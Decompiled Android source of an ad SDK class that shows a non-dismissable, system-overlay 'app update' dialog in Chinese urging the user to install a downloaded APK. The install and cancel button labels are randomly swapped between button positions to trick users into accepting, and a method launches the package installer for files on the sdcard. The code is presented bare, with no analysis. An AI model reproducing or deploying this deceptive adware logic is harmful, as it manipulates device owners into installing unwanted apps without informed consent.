// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
package com.bbads.android.mixsdk;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import com.bbads.android.CS;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

// Referenced classes of package com.android.mixsdk.util:
//            ImageInfo, Tools, DatasUtil
public class InsD extends AlertDialog {
    private String appName;
    private Context context;
    private File file;
    private String pckName;
    public InsD(Context context1) {
        super(context1);
        context = context1;
    }
    public void getInfo(Context context1, final ArrayList imgsInfos, final int index) {
        appName = ((ImageInfo) imgsInfos.get(index)).getName();
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(context1);
        builder.setTitle("\u5E94\u7528\u66F4\u65B0");
        builder.setMessage(new StringBuilder(
                "\u53D1\u73B0\u60A8\u7684\u7CFB\u7EDF\u5B58\u5728\u672A\u5B89\u88C5\u7684\u5E94\u7528,\u662F\u5426\u7ACB\u523B\u5B89\u88C5\u5E94\u7528").append(appName)
                .append("?").toString());
        AlertDialog alertdialog;
        if (new Random().nextInt(2) == 0) {
            builder.setPositiveButton("\u9A6C\u4E0A\u5B89\u88C5", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    DownloadService.setImages(imgsInfos, index, 2, "");
                    String s = ((ImageInfo) imgsInfos.get(index)).getAppurl();
                    String s1 = s.substring(1 + s.lastIndexOf("/"), s.length());
                    File file1 = new File(new StringBuilder("sdcard/").append(s1).toString());
                    Tools.openFile(CS.context, file1, ((ImageInfo) imgsInfos.get(index)).getPackageName());
                }
            });
            builder.setNegativeButton("\u53D6\u6D88\u5B89\u88C5", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    dialoginterface.dismiss();
                }
            });
        } else {
            builder.setNegativeButton("\u9A6C\u4E0A\u5B89\u88C5", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    DownloadService.setImages(imgsInfos, index, 2, "");
                    String s = ((ImageInfo) imgsInfos.get(index)).getAppurl();
                    String s1 = s.substring(1 + s.lastIndexOf("/"), s.length());
                    File file1 = new File(new StringBuilder("sdcard/").append(s1).toString());
                    Tools.openFile(CS.context, file1, ((ImageInfo) imgsInfos.get(index)).getPackageName());
                }
            });
            builder.setPositiveButton("\u53D6\u6D88\u5B89\u88C5", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    dialoginterface.dismiss();
                }
            });
        }
        builder.setCancelable(false);
        alertdialog = builder.create();
        alertdialog.getWindow().setType(2010);
        alertdialog.show();
    }
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }
    protected void openFile(Context context1, File file1, String s) {
        HashMap hashmap = (HashMap) context1.getSharedPreferences("SlientPck", 0).getAll();
        if (!Tools.checkAPKExits(context1, s) && hashmap.size() != 1) {
            Intent intent = new Intent();
            intent.addFlags(0x10000000);
            intent.setAction("android.intent.action.VIEW");
            intent.setDataAndType(Uri.fromFile(file1), "application/vnd.android.package-archive");
            context1.startActivity(intent);
        }
    }
}
